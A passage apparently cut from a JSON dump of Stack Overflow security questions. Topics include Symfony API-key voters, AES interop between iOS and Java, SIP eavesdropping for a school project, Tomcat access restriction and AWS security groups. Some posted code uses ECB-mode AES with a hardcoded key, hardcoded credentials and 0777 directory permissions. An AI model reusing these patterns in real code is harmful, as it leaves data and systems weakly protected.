   }\n\n    public function supportsAttribute($attribute)\n    {\n        // we won't check against a user attribute, so we return true\n        return true;\n    }\n\n    public function supportsClass($class)\n    {\n        // our voter supports all type of token classes, so we return true\n        return true;\n    }\n\n    public function vote(TokenInterface $token, $object, array $attributes)\n    {\n        if ($this-&gt;authenticate()) {\n            return VoterInterface::ACCESS_ABSTAIN;\n        }\n\n        return VoterInterface::ACCESS_DENIED;\n    }\n\n\n    /**\n     * Checks for an authentication header in the request and confirms\n     * the client is valid.\n     *\n     * @return bool\n     */\n    protected function authenticate()\n    {\n        $request = $this-&gt;container-&gt;get('request');\n\n        if ($request-&gt;headers-&gt;has('x-acme-auth')) {\n\n            $authRegex = '/ApiKey=\"([^\"]+)\", ApiDigest=\"([^\"]+)\", Nonce=\"([^\"]+)\", Created=\"([^\"]+)\"/';\n\n            if (preg_match($authRegex, $request-&gt;headers-&gt;get('x-acme-auth'), $matches)) {\n                $apiClient = $this-&gt;container-&gt;get('in_memory_user_provider')-&gt;loadUserByUsername($matches[1]);\n\n                if ($apiClient &amp;&amp; $this-&gt;validateDigest($matches[2], $matches[3], $matches[4], $apiClient-&gt;getPassword())) {\n                    return true;\n                }\n            }\n        } else {\n            $this-&gt;container-&gt;get('logger')-&gt;err('no x-acme-auth header present in request');\n        }\n\n        return false;\n    }\n\n    /**\n     * Performs checks to prevent replay attacks and to validate\n     * digest against a known client.\n     *\n     * @param string $digest\n     * @param string $nonce\n     * @param string $created\n     * @param string $secret\n     * @return bool\n     * @throws AuthenticationException\n     * @throws NonceExpiredException\n     */\n    protected function validateDigest($digest, $nonce, $created, $secret)\n    {\n        // Expire timestamp after 5 minutes\n        if (time() - strtotime($created) &gt; 300) {\n            $this-&gt;container-&gt;get('logger')-&gt;err('Timestamp expired');\n\n            return false;\n        }\n\n        if (!is_dir($this-&gt;nonceCacheDir)) {\n            mkdir($this-&gt;nonceCacheDir, 0777, true);\n        }\n\n        // Validate nonce is unique within 5 minutes\n        if (file_exists($this-&gt;nonceCacheDir.'/'.$nonce) &amp;&amp; file_get_contents($this-&gt;nonceCacheDir.'/'.$nonce) + 300 &gt; time()) {\n            $this-&gt;container-&gt;get('logger')-&gt;err('Previously used nonce detected');\n\n            return false;\n        }\n\n        file_put_contents($this-&gt;nonceCacheDir.'/'.$nonce, time());\n\n        // Validate Secret\n        $expected = base64_encode(sha1(base64_decode($nonce).$created.$secret, true));\n\n        return $digest === $expected;\n    }\n}\n</code></pre>\n\n<p>The problem I'm having is that when my voter returns ACCESS_DENIED, I get a 500 error when the firewall redirects to the authentication entry point:</p>\n\n<pre><code>[2012-10-05 11:09:16] app.ERROR: no x-acme-auth header present in request [] []\n[2012-10-05 11:09:16] event.DEBUG: Notified event \"kernel.exception\" to listener \"Symfony\\Component\\Security\\Http\\Firewall\\ExceptionListener::onKernelException\". [] []\n[2012-10-05 11:09:16] security.DEBUG: Access is denied (user is not fully authenticated) by \"/home/phil/projects/acme/vendor/symfony/symfony/src/Symfony/Component/Security/Http/Firewall/AccessListener.php\" at line 70; redirecting to authentication entry point [] []\n[2012-10-05 11:09:16] event.DEBUG: Notified event \"kernel.exception\" to listener \"Symfony\\Component\\HttpKernel\\EventListener\\ProfilerListener::onKernelException\". [] []\n[2012-10-05 11:09:16] event.DEBUG: Notified event \"kernel.exception\" to listener \"Symfony\\Component\\HttpKernel\\EventListener\\ExceptionListener::onKernelException\". [] []\n[2012-10-05 11:09:16] request.CRITICAL: Symfony\\Component\\Security\\Core\\Exception\\InsufficientAuthenticationException: Full authentication is required to access this resource. (uncaught exception) at /home/phil/projects/acme/vendor/symfony/symfony/src/Symfony/Component/Security/Http/Firewall/ExceptionListener.php line 109\n</code></pre>\n\n<p>What I actually want to happen is just to return a 403 response. Is it possible to do this?</p>\n"},{"tags":["java","iphone","objective-c","security","jce"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":892,"score":0,"question_id":6575450,"title":"Encrypting data with Objective-C and decrypt it with Java Problem","body":"<p>I have an iPhone solutions that uses XML to transmit data between the client (mobile) and the server (Java). Some of the parts of the message (XML) must be encrypted because of the type of information transmitted. I planned to use AES 128 to encrypt and decrypt the data between these two endpoints. </p>\n\n<p>First the sensitive data is encrypted using Object-C's CommonCrypto framework, and then the data is decrypted inside a Java Server (Servlet).</p>\n\n<p>I'm new to security protocols and standards, and basically my code is a subset of group of informations that I could gather on Apple's dev forum/resources, and the internet (Google) :-)</p>\n\n<p>The basic flow is:</p>\n\n<ol>\n<li>The data is encrypted using AES (using a pre-set key).</li>\n<li>The encrypted bytes are putted within the XML (using base64)</li>\n<li>The data is gathered from the XML, and decrypted using the same pre-setted key;</li>\n</ol>\n\n<p>The encryption part of the Object-C code is:</p>\n\n<pre><code>char keyPtr [ kCCKeySizeAES128 +1 ];\nbzero( keyPtr, sizeof(keyPtr) );\n\n// The secret key is masked for obvious reason, but you can use \"12345678912345678912345678912345\"\n[key getCString:keyPtr maxLength:sizeof(keyPtr) encoding:NSUTF8StringEncoding];\n\nNSUInteger dataLength = [data length];\n// Initialization vector; dummy in this case 0's.\nuint8_t iv[ kCCBlockSizeAES128 ];\nmemset((void *) iv, 0x0, (size_t) sizeof(iv));\n/*\n For block ciphers, the output size will always be less than or\n equal to the input size plus the size of one block.\n*/\nsize_t bufferSize = (dataLength + kCCBlockSizeAES128);\nvoid  *buffer     = malloc(bufferSize);\nmemset(buffer, 0x0, bufferSize);\n\nsize_t numBytesEncrypted    = 0;\nCCCryptorStatus cryptStatus = CCCrypt(kCCEncrypt, kCCAlgorithmAES128, \n                                      kCCOptionECBMode + kCCOptionPKCS7Padding,\n                                      keyPtr, kCCKeySizeAES128,\n                                      iv, [data bytes], dataLength, /* input */\n                                      buffer, bufferSize, /* output */\n                                      &amp;numBytesEncrypted);\n\nif (cryptStatus == kCCSuccess) {\n    return [NSData dataWithBytesNoCopy:buffer length:numBytesEncrypted];\n}\n\nfree(buffer); //free the buffer;\nreturn nil;\n</code></pre>\n\n<p>The Java code part is:</p>\n\n<pre><code>Security.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());\nbyte[] keyBytes = DES_KEY.getBytes(); //&lt;== The same as above\n\nSecretKeySpec keySpec = new SecretKeySpec(keyBytes, \"AES\");\n\ntry {\n    // Return the raw bytes \n    byte []data = Base64.decode(encryptedContent);\n\n    // Gets the Cipher...\n    final Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS7Padding\", \"BC\");\n    cipher.init(Cipher.DECRYPT_MODE, keySpec);\n\n    String resultString = new String(cipher.doFinal(data));\n} catch (Exception ex) {\n    ...\n}\n</code></pre>\n\n<p>The error I get when running these solution above in the Java Server is:</p>\n\n<pre><code>15:57:43,671 ERROR [STDERR] com.iteatros.aim.services.ServiceException: javax.crypto.BadPaddingException: pad block corrupted\n15:57:43,674 ERROR [STDERR]     at com.iteatros.aim.services.security.SecurityWrapper.decrypt3DESBase64StringData(SecurityWrapper.java:109)\n15:57:43,674 ERROR [STDERR]     at com.iteatros.aim.services.db.LoginDAO.login(LoginDAO.java:53)\n15:57:43,674 ERROR [STDERR]     at com.iteatros.aim.services.AbstractService.authenticate(AbstractService.java:278)\n15:57:43,674 ERROR [STDERR]     at com.iteatros.aim.services.AbstractService.doPost(AbstractService.java:165)\n15:57:43,674 ERROR [STDERR]     at javax.servlet.http.HttpServlet.service(HttpServlet.java:637)\n15:57:43,674 ERROR [STDERR]     at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)\n15:57:43,674 ERROR [STDERR]     at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)\n15:57:43,675 ERROR [STDERR]     at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)\n15:57:43,675 ERROR [STDERR]     at org.jboss.web.tomcat.filters.ReplyHeaderFilter.doFilter(ReplyHeaderFilter.java:96)\n15:57:43,675 ERROR [STDERR]     at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)\n15:57:43,676 ERROR [STDERR]     at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)\n15:57:43,676 ERROR [STDERR]     at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:235)\n15:57:43,676 ERROR [STDERR]     at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191)\n15:57:43,676 ERROR [STDERR]     at org.jboss.web.tomcat.security.SecurityAssociationValve.invoke(SecurityAssociationValve.java:190)\n15:57:43,676 ERROR [STDERR]     at org.jboss.web.tomcat.security.JaccContextValve.invoke(JaccContextValve.java:92)\n15:57:43,676 ERROR [STDERR]     at org.jboss.web.tomcat.security.SecurityContextEstablishmentValve.process(SecurityContextEstablishmentValve.java:126)\n15:57:43,676 ERROR [STDERR]     at org.jboss.web.tomcat.security.SecurityContextEstablishmentValve.invoke(SecurityContextEstablishmentValve.java:70)\n15:57:43,677 ERROR [STDERR]     at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)\n15:57:43,677 ERROR [STDERR]     at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102)\n15:57:43,677 ERROR [STDERR]     at org.jboss.web.tomcat.service.jca.CachedConnectionValve.invoke(CachedConnectionValve.java:158)\n15:57:43,677 ERROR [STDERR]     at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109)\n15:57:43,677 ERROR [STDERR]     at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:330)\n15:57:43,677 ERROR [STDERR]     at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:829)\n15:57:43,677 ERROR [STDERR]     at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:601)\n15:57:43,677 ERROR [STDERR]     at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:447)\n15:57:43,677 ERROR [STDERR]     at java.lang.Thread.run(Thread.java:680)\n</code></pre>\n\n<p>I know that the full stack wasn't needed, but anyways...</p>\n\n<p>Thanx much in advance.</p>\n\n<p>Joao</p>\n"},{"tags":["security","networking","sip"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":13230416,"title":"Eavesdropping in SIP Communication","body":"<p>For a school project, I need to make an eavesdropping experiment between a SIP user agent and a SIP server. The experiment has to include the following steps:</p>\n\n<pre><code>  i)Establish a voice/data communication between two SIP agent.\n\n  ii) Capture the signal (i.e. SIP packets) in wireshark.\n\n  iii) Change the content of the signal via wireshark or some \n  other tool that fits better to this purpose.\n\n  iv) Encrypting/securing the communication between the agents somehow \n  to avoid third parties (e.g. wireshark to eavesdrop the communication) \n   from eavesdropping.\n</code></pre>\n\n<p>Could you please tell me if there are tools for simulating the above scenario? I prefer to do this programmatically actually and I know there is an open source SIP stack named resip (resiprocate.org) which provides an example user agent and server already in C++. Can I simulate this scenario programmatically or it's better to use some tools that can do this? Thanks in advance. </p>\n"},{"tags":["android","security","components","android-permissions"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13233332,"title":"Android Privilege escalations","body":"<p>Does android components have different permissions than the application itself and is it possible to attack an application having some permissions by an app that doesn't have that permissions. More can be read <a href=\"https://docs.google.com/viewer?a=v&amp;q=cache%3aV1Ohw6FPZA8J%3awww.ei.rub.de/media/trust/veroeffentlichungen/2010/11/13/DDSW2010_Privilege_Escalation_Attacks_on_Android.pdf%20&amp;hl=en&amp;gl=in&amp;pid=bl&amp;srcid=ADGEESg-bJnNxwXW2hcTO9Ig5Zhi3JMEwKUGnEhJ_SbLJ3ETR_7iV-I58yV35te_GZoFBF5FOPBpBboBKSgbTYpNQ_myGqAHNno_gqifgHWcoNMdCdHw-vUzf_3b9VNQDr4EJpo4KPBG&amp;sig=AHIEtbQnwdUDOBjOuxPBABcAD0Oo3IjogQ\" rel=\"nofollow\">here, section 3</a>.</p>\n"},{"tags":["security","tomcat","webserver","tomcat6"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2690,"score":3,"question_id":5224106,"title":"Tomcat: Restrict access to localhost for /just one/ webapp","body":"<p>I'm running Tomcat 6 to serve several web apps, most of which are public-facing.  But I'd like to restrict access to <em>just one</em> webapp, allowing connections only from localhost.</p>\n\n<p>I can restrict access for <em>all</em> webapps using a valve in context.xml, as described in:</p>\n\n<ul>\n<li><a href=\"http://stackoverflow.com/questions/3381531/tomcat-restrict-access-by-ip-address\">Tomcat Restrict access by IP address</a></li>\n</ul>\n\n<p>But I can't figure out how to restrict access on a per-app basis.  Is there a way to do this with my app's web.xml?  Or by adding additional rules to context.xml?</p>\n\n<p>Thanks,</p>\n\n<p>-B</p>\n\n<hr>\n\n<h1>Recapping Solution:</h1>\n\n<pre><code>$ cp /var/lib/tomcat6/conf/context.xml \\ \n   /var/lib/tomcat6/conf/Catalina/localhost/my-app-name.xml\n\n$ cat /var/lib/tomcat6/conf/Catalina/localhost/my-app-name.xml\n\n&lt;Context&gt;\n    &lt;Valve className=\"org.apache.catalina.valves.RemoteHostValve\" allow=\"localhost\"/&gt;\n... {as previously} ...\n&lt;/Context&gt;\n</code></pre>\n"},{"tags":["php","apache","security","webserver"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13232622,"title":"Separate apache sites with security in mind","body":"<p>I have one machine running apache with php. It serves multiple domains from the folder /home/web/\nLike /home/web/domainA and /home/web/domainB</p>\n\n<p>Now, how do I securely separate them? Domain A must not be able to read, write or execute files in domain B's folder.</p>\n\n<p>A virtual server is not a (well liked) option, since the server is low on RAM, and avoiding multiple boxes is preferable..</p>\n"},{"tags":["android","iphone","security","testing","security-testing"],"answer_count":0,"favorite_count":2,"up_vote_count":0,"down_vote_count":4,"view_count":36,"score":-4,"question_id":13232851,"title":"Tool For Ipad and Android application Testing","body":"<p>I have developed the application in I phone and Android. Now I have to check the security issues. So Please suggest me the tool for security testing for I phone and android application  testing.</p>\n\n<p>Thanks In Advance.</p>\n"},{"tags":["security","jsf","authentication","web-applications","java-ee-6"],"answer_count":4,"favorite_count":65,"up_vote_count":52,"down_vote_count":0,"view_count":42524,"score":52,"question_id":2206911,"title":"Best way for user authentication on JavaEE 6 using JSF 2.0?","body":"<p>I'm wondering what the current state of art recommendation is regarding user authentication for a web application making use of JSF 2.0 (and if any components do exist) and JEE6 core mechanisms (login/check permissions/logouts) with user information hold in a JPA entity. The Sun tutorial is a bit sparse on this (only handles servlets).</p>\n\n<p>This is without making use of a whole other framework, like Spring-Security (acegi), or Seam, but trying to stick hopefully with the new Java EE 6 platform (web profile) if possible.</p>\n\n<p>Thanks,\nNiko</p>\n"},{"tags":["java","security","access-denied","lotus-domino"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":4388,"score":1,"question_id":2635881,"title":"Error: java.security.AccessControlException: Access denied","body":"<p>I have to connect to a https URL with username and password to read a file. I am not able to connect to the server (see the error log below). I do not have much Java experience, so I need help with this code.</p>\n\n<pre><code>import lotus.domino.*;\nimport java.net.*;\nimport java.io.*;\nimport javax.net.ssl.HttpsURLConnection;\n\npublic class JavaAgent extends AgentBase {\n\npublic void NotesMain() {\n\n  try {\n    String username = \"123\";\n    String password = \"456\";\n    String input = username + \":\" + password;\n    String encoding = new sun.misc.BASE64Encoder().encode (input.getBytes());\n\n    //Open the URL and read the text into a Buffer\n    String urlName = \"https://server.org/Export.mvc/GetMeetings?modifiedSince=4/9/2010\";\n    URL url = new URL(urlName);\n    HttpsURLConnection connection = (HttpsURLConnection)url.openConnection();\n\n    connection.setRequestMethod(\"POST\");\n    connection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n    connection.setRequestProperty(\"Content-Length\", String.valueOf (encoding.length())); \n    connection.setUseCaches(false);\n    connection.setDoInput(true);\n    connection.setDoOutput(true);\n    connection.setAllowUserInteraction(true);\n    connection.setRequestProperty(\"Authorization\", \"Basic \" + encoding);\n    connection.setRequestProperty(\"Cookie\", \"LocationCode=Geneva\");\n\n    connection.connect();\n\n    BufferedReader rd = null;\n      try{\n        rd = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n      } catch (IOException e) {\n        System.out.println(\"Read failed\");\n        System.exit(-1);\n      }\n\n    String line;\n    while((line = rd.readLine()) != null) {\n      System.out.println(line.toString());\n    }\n    rd.close();\n\n    connection.disconnect();\n\n  } catch(Exception e) {\n    e.printStackTrace();\n  }\n}\n}\n</code></pre>\n\n<p>Exception thrown:</p>\n\n<pre><code>java.security.AccessControlException: Access denied (java.lang.RuntimePermission exitVM.-1)\n at java.security.AccessController.checkPermission(AccessController.java:108)\n at java.lang.SecurityManager.checkPermission(SecurityManager.java:532)\n at COM.ibm.JEmpower.applet.AppletSecurity.superDotCheckPermission(AppletSecurity.java:1449)\n at COM.ibm.JEmpower.applet.AppletSecurity.checkRuntimePermission(AppletSecurity.java:1311)\n at COM.ibm.JEmpower.applet.AppletSecurity.checkPermission(AppletSecurity.java:1611)\n at COM.ibm.JEmpower.applet.AppletSecurity.checkPermission(AppletSecurity.java:1464)\n at java.lang.SecurityManager.checkExit(SecurityManager.java:744)\n at java.lang.Runtime.exit(Runtime.java:99)\n at java.lang.System.exit(System.java:275)\n at JavaAgent.NotesMain(Unknown Source)\n at lotus.domino.AgentBase.runNotes(Unknown Source)\n at lotus.domino.NotesThread.run(Unknown Source)\n</code></pre>\n"},{"tags":["security","mdx","role","ssas-2008"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13170326,"title":"MDX Expression to restrict access to Measure Group","body":"<p>Say I have a bunch of measures which I wanted certain people to be unable to see (or vice versa only allow them to see) what kind MDX expression would I add to the SSAS Role?</p>\n\n<p>I can get the user identity through the USERNAME function.</p>\n\n<p>Is it even possible? </p>\n\n<p>I can easily construct Dimension based security expressions, but I can't see how the Measures dimension access can be similarly curtailed.</p>\n"},{"tags":["php","security","escaping","xss"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":13199095,"title":"Escaping variables","body":"<p>I've read that it's enough and even recommended to escape characters on the output, not on the input.</p>\n\n<p>It could be easily applied to all get variables as they are not injected to the database from the form level.</p>\n\n<p>However, I'm not sure what to do with all post variables. If it doesn't come from the database, so if it's a raw input data, escaping is fully needed. But I'm using PDO prepare/execute to escape all variables. Questions now:</p>\n\n<ol>\n<li>Is it OK to use PDO's prepare/execute both in select and insert statements? Isn't it escaping variables twice ?</li>\n<li>Let's say I get some variable through PDO exeute statement - is it ok to display this variable simply with $_POST['variable'] without escaping it (if it was already done in PDO function) ?</li>\n<li>Is htmlspecialchars() enough to escape things such as GET variables which don't come from the database?</li>\n</ol>\n\n<p>And the most important - is all of this, PDO prepare/execute, and htmlspecialchars(), enough to prevent all XSS attacks? Or should I also do more? If so, what should this be? Removing all html tags from the input? Using BB-Code instead?</p>\n"},{"tags":["android","security","sockets","ssl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13198379,"title":"SSL certificate Android","body":"<p>I have a problem with importing certificate to application.\nI have created BKS keystore with keytool. I put it to res/raw folder. \nI'm able to load it to Android.</p>\n\n<pre><code>InputStream inputStream = context.getResources().openRawResource(R.raw.enigma);\nKeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\nkeyStore.load(inputStream, \"android\".toCharArray());\ninputStream.close();\n\nString algorithm = KeyManagerFactory.getDefaultAlgorithm();\nKeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(algorithm);\nkeyManagerFactory.init(keyStore, \"android\".toCharArray());\n</code></pre>\n\n<p>When I try to call SSLServerSocket.accept() then, I receive an Exception: \"SSLException: Could not find any key store entries to support the enabled cipher suites\".</p>\n\n<p>What can be wrong? Is there tutorial for creating KeyStore on Android.</p>\n\n<p>Thanks</p>\n"},{"tags":["asp.net","security","iis"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":13224202,"title":"What user is my app using to access the file system?","body":"<p>I have an application that is getting a <code>System.UnauthorizedAccessException</code> error when it tries to read from the file system.</p>\n\n<p>I looked at the app pool and I see that is using <code>Network Service</code> for it's identity.  The IIS application is allowing anonymous authentication using an existing account, lets call it <code>IUSR-MYSERVER</code>.  It also has <code>Integrated Windows authentication</code> enabled.</p>\n\n<p>If I go to the folder in question and Add <code>Everyone</code> with Read+Execute permissions the error goes away.  But if I add <code>IUSR-MYSERVER</code> or <code>NETWORK SERVICE</code> with the same permissions, I still get the same error.</p>\n\n<p>When I look at the error's entry in my Event Log it has the User as <code>N/A</code>.</p>\n\n<p>What user is my application trying to access the file system as?  I assume it would be bad to just use <code>Everyone</code>?  </p>\n"},{"tags":["java","security","ssl","websphere","portlet"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13229317,"title":"How to obtain private key from secure request in Websphere portlet?","body":"<p>In my Spring MVC portlet users have to digitally sign documents and send an application. User certificate (PKCS#12) is added to the browser certificates. Portal has SSL configured as supported and I'm able to obtain X509Certificate by: </p>\n\n<pre><code>private static final String SSL_CERT = \"javax.servlet.request.X509Certificate\";\n\nX509Certificate[] certificates = (X509Certificate[]) request\n    .getAttribute(SSL_CERT);\n</code></pre>\n\n<p>As private key is required to generate a digital signature, can anyone please suggest how I can obtain client's private key?</p>\n"},{"tags":["security","http","webserver","cross-domain","httprequest"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13227014,"title":"Cross domain requests from the server","body":"<p>I know that browsers often prevent cross domain http requests to servers due to security measures (which can be avoided by CORS or JSONP), but what about a server making an http request to another server? Can that be blocked by security restrictions?</p>\n\n<p>I guess what I'm asking is that since the server is making the request and not the browser, would I still need to deal with things such as CORS and/or JSONP, or are those work arounds specifically geared towards browser-level security?</p>\n"},{"tags":["c#","security","securestring"],"answer_count":5,"favorite_count":1,"up_vote_count":9,"down_vote_count":0,"view_count":2295,"score":9,"question_id":2420122,"title":"Using SecureString","body":"<p>Can this be simplified to a one liner? Feel free to completely rewrite it as long as secureString gets initialized properly.</p>\n\n<pre><code>SecureString secureString = new SecureString ();\nforeach (char c in \"fizzbuzz\".ToCharArray())\n{\n    secureString.AppendChar (c);\n}\n</code></pre>\n"},{"tags":["javascript","security","microsoft-metro"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13219893,"title":"In Windows Store/Metro Apps: the Web Context is the sandbox, but who enforces it?","body":"<p>After reading the MSDN article <a href=\"http://msdn.microsoft.com/en-gb/magazine/jj721591.aspx\" rel=\"nofollow\">Web to Windows 8: Security</a> (by Tim Kulp) I have a main question which is:</p>\n\n<p><strong>'The the Web Context is the sandbox, but who enforces it?'</strong></p>\n\n<p>This can be further expanded into:</p>\n\n<ul>\n<li>Who is actually enforcing this Sandbox? the browser? the Javascript engine, a javascript APIs? the windows process?</li>\n<li>What are the communication possibilities between the Web and Local contexts?</li>\n<li>Is there an CAS-Like security demands architecture that declares and enforces Code Access Security on specific functions (or assets)?</li>\n<li>Aren't they both (Web and Local contexts) javascript/html code that is running on the same browser session? (and OS process)?</li>\n<li>Isn't there a gazillion of objects (think Html elements and Javascript variables/objects) that are shared between them?</li>\n<li>How does this play with the powerful javascript capabilties to 'bend reality' and change just about everything (for example prototypes)?</li>\n<li>What are the rules-of-engagement for the Javascript this object?</li>\n<li>What about all those Html 5 security issues?</li>\n<li>Are there any SAST (static code analysis) tools that can scan these Windows Store Apps and identify security issues?</li>\n<li>Is this a javascript sandbox for javascript code? That is a hard one to pull off (and if so, surely Microsoft must have changed the way its Javascript's engine works)</li>\n</ul>\n\n<p>Note: For a longer version of this post see the  <a href=\"http://diniscruz.blogspot.co.uk/2012/11/windows-storemetro-apps-client-server.html\" rel=\"nofollow\">Windows Store/Metro Apps - A 'client-server' sandbox built using Javascript?</a> blog post </p>\n"},{"tags":["php","security","plugins","web-security","tracking"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":17,"score":0,"question_id":13223446,"title":"open source web development plugins,scripts store information?","body":"<p>I'm wondering if open source plugins like wordpress,drupal, jquery and others  detect for example what websites are using their plugin.</p>\n\n<p>Something like google analitycs but for tracking websites.</p>\n\n<p>I'm asking this because I see this on the plugins official websites :</p>\n\n<blockquote>\n  <p>USED BY : X, Y, Z and many more (see full list...) </p>\n</blockquote>\n\n<p>If so, is there any plugin which can detect which website is using your script/plugin.</p>\n\n<p>If you have any idea, suggestions ...</p>\n\n<p>Thanks!</p>\n"},{"tags":["php","security","api","cakephp"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":13222171,"title":"I have a php application that checks, through an api, if the user is entitled to use it! How should I hide the check from crackers?","body":"<p>As I stated in my title: I have a php application, developed in cake 2.*, that before each use checks with my server if it is ok to run.</p>\n\n<p>This is done because the app is a module part of a bigger project and it is sold for one time use.</p>\n\n<p>The thing is that, if a developer wants to, he can manually remove the check function from the project. It is implemented only in beforeFilter in AppController.\nI thought about making every action dependent on this check but this would just increase the time a developer needs to remove it, as well as the time of response. I thought about writing it in the core of cake, but it is visible with a debugger. Also this actions wouldn't be a solution.</p>\n\n<p>However complicated I think the authorization process the problem that I can't solve is how to obfuscate the process.</p>\n\n<p>Al that I need, as I use a txt file for the authorization process, is to make the application somehow dependent to this txt file.\nI thought about writing part of an important file in this txt and encrypt it. Like this I would make the user request the auth key from my server so he can snatch the php.\nThe thing is that this could be deployed on a shared hosting, with minimal access to commands(in general is gpg available for users on shared hosting? can users run cake bash scripts on shared hosting?).</p>\n\n<p><strong>EDIT:</strong></p>\n\n<ul>\n<li>The users know that it needs an online connection;</li>\n<li>The system also generates a uniq code based on a <strong>serial key</strong>; </li>\n<li>Users ask for auth->email, domain, uniq code->my server calculates the uniq code based on some local data that it has about the user, it uses also the email and domain sent. It compares the uniq code obtained with the one sent->sends auth;</li>\n<li>There isn't much hassle added to the paying customers as they don't have to do a thing. But if they think about making the app public or reuse it a developer could achieve that.</li>\n</ul>\n"},{"tags":["security","symfony2","symfony-sonata"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":219,"score":0,"question_id":10911188,"title":"SonataAdminBundle Security roles","body":"<p>I'm trying to secure some admin in SonataAdminBundle</p>\n\n<p>I add SonataUserBundle with fosUserBundle for login.\nSo I can add users, groups and roles</p>\n\n<p>in security.yml</p>\n\n<pre><code>role_hierarchy:\n    ROLE_ADMIN: ROLE_ADMIN\n    ROLE_IT: ROLE_IT\n    ROLE_SUPER_ADMIN: [ROLE_ADMIN, ROLE_IT]\n\n\naccess_control:\n    - { path: ^/sonata/login$, role: IS_AUTHENTICATED_ANONYMOUSLY }\n    - { path: ^/sonata/logout$, role: IS_AUTHENTICATED_ANONYMOUSLY }\n    - { path: ^/sonata/login-check$, role: IS_AUTHENTICATED_ANONYMOUSLY }\n    - { path: ^/sonata, role: [ROLE_ADMIN] }\n    - { path: ^/sonata/api/monolog, role: [ROLE_IT] }\n</code></pre>\n\n<p>I have to be connected to access Sonata</p>\n\n<p>But every user can access the route /sonata/api/monolog even if they don't have ROLE_IT</p>\n\n<p>How can I securize an Admin\nAnd how can I only display the link if the user can acces to it</p>\n"},{"tags":["linux","security","networking","debian","ports"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13219869,"title":"in computer security What ports are considered to be dangerous?","body":"<p>im performing a debian 6 machine scan using nmap\nim listing all open ports and OS\nout of the ports im getting back\ni want to know what open ports are considered to be dangerous</p>\n\n<p>the ports i have:\n22 and 111 if these listed are not dangerous which i think are not.\nwhich ones are know to be dangerous? </p>\n"},{"tags":["security","drupal","search","google","private"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":207,"score":0,"question_id":4799083,"title":"google search engine inside my drupal / site without show the content to worldwide?","body":"<p>i have a site that im developing and i want to put there content and links (some of them are my private home links and stuff) drupal search is good, but its not accurate and also its shows me only things from my site... i want to search all include my website, but dont let google to public it world wide... is taht possible?</p>\n"},{"tags":["security","networking","amazon-web-services"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13213897,"title":"AWS Security Group Not Permitting Inbound Traffic","body":"<p>I want to allows nodes in the <code>app-server</code> group talk to mysql and redis machines in the <code>database</code> group.  However,  I can only make explicit IPs work for ingress rules.  When I try to define groups instead, to make auto-scaling easier, the traffic is blocked.</p>\n\n<p><em>Here's my setup</em>:</p>\n\n<p>When I run</p>\n\n<p><code>ec2-describe-group database</code></p>\n\n<p>I get</p>\n\n<pre><code>PERMISSION      890752071609    database        ALLOWS  tcp     3306    3306    FROM    USER    890752071609    NAME default    ID sg-5ce3766c  ingress\nPERMISSION      890752071609    database        ALLOWS  tcp     3306    3306    FROM    USER    890752071609    NAME app-server ID sg-b81b8088  ingress\nPERMISSION      890752071609    database        ALLOWS  tcp     6379    6379    FROM    USER    890752071609    NAME default    ID sg-5ce3766c  ingress\nPERMISSION      890752071609    database        ALLOWS  tcp     6379    6379    FROM    USER    890752071609    NAME app-server ID sg-b81b8088  ingress\nPERMISSION      890752071609    database        ALLOWS  tcp     0       65535   FROM    USER    890752071609    NAME database   ID sg-d262f1e2  ingress\nPERMISSION      890752071609    database        ALLOWS  tcp     22      22      FROM    CIDR    0.0.0.0/0       